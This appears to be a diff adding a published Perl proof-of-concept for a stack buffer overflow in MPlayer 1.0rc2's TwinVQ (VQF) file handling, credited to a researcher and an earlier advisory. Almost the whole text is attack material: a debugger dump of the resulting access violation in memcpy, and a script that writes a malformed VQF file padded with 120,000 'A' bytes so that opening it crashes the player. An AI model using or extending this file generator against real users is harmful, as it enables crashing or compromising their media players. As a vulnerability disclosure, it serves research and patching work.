@@ -1,0 +1,49 @@
+#!/usr/bin/perl
+# MPlayer 1.0rc2 TwinVQ Stack Buffer Overflow PoC
+# PoC by Amirreza Aminsalehi "sCORPINo"
+#        (Proud To be an Abay)
+#     scorpino x40 gmail x2e com
+# Snoop Security Researching Committee
+#       www.snoop-security.com
+# Originaly this bug discovered by Tobias Klein
+# advisory @ http://trapkit.de/advisories/TKADV2008-014.txt
+# Tested on a windows xp sp2 english system and get SIG 11 after openning the PoC with MPlayer  ;)
+# I did'nt find any document that explain VQF file format, So I reversed that file format to get the headers.
+# special tnX to: Shahriyar, Adel, Alireza, Yashar and all snoop members 
+###########################################################################################
+# You Can See Debug dumps here:
+#
+#(8ec.748): Access violation - code c0000005 (first chance)
+#First chance exceptions are reported before any exception handling.
+#This exception may be expected and handled.
+#eax=0c6257d4 ebx=001f4150 ecx=030fc9f5 edx=00000001 esi=00232fff edi=00215abc
+#eip=77c46fa3 esp=001f4120 ebp=001f4128 iopl=0         nv up ei pl nz ac pe nc
+#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210216
+#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\msvcrt.dll - 
+#msvcrt!memcpy+0x33:
+#77c46fa3 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+#0:000> g
+#(8ec.748): Access violation - code c0000005 (!!! second chance !!!)
+#eax=0c6257d4 ebx=001f4150 ecx=030fc9f5 edx=00000001 esi=00232fff edi=00215abc
+#eip=77c46fa3 esp=001f4120 ebp=001f4128 iopl=0         nv up ei pl nz ac pe nc
+#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200216
+#msvcrt!memcpy+0x33:
+#77c46fa3 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+###########################################################################################
+my $file="amir.vqf";
+open(my $FILE, ">$file") or die "Cannot open $file: $!";
+$head  = "\x00\x01\xD4\xC0"; #SIZE
+$head2 = "\x43\x4f\x4d\x4d"; #COMM
+$head3 ="\x00\x00\x00\x10\x00\x00\x00\x01\x00\x00\x00\x60\x00\x00\x00\x2c".
+		"\x00\x00\x00\x00\x4e\x41\x4d\x45\x00\x00\x00\x0b\x47\x69\x6c\x64".
+		"\x65\x64\x20\x43\x61\x67\x65\x41\x55\x54\x48\x00\x00\x00\x11\x42".
+		"\x6c\x61\x63\x6b\x6d\x6f\x72\x65\x91\x73\x20\x4e\x69\x67\x68\x74".
+		"\x28\x63\x29\x20\x00\x00\x00\x04\x4a\x75\x72\x61\x41\x4c\x42\x4d".
+		"\x00\x00\x00\x0d\x53\x65\x63\x72\x65\x74\x20\x56\x6f\x79\x61\x67".
+		"\x65\x54\x52\x43\x4b\x00\x00\x00\x02\x30\x33\x44\x41\x54\x41\x0c"; # other headers. Not in mood to separate every one ;)
+
+print $FILE  "TWIN97012000".$head.$head2.$head3. "A" x 120000; #don't pay attention to "A" repeat times.It's just a guess :p
+close($FILE);
+print "$file has been created \n";  
+
+# milw0rm.com [2009-01-16]
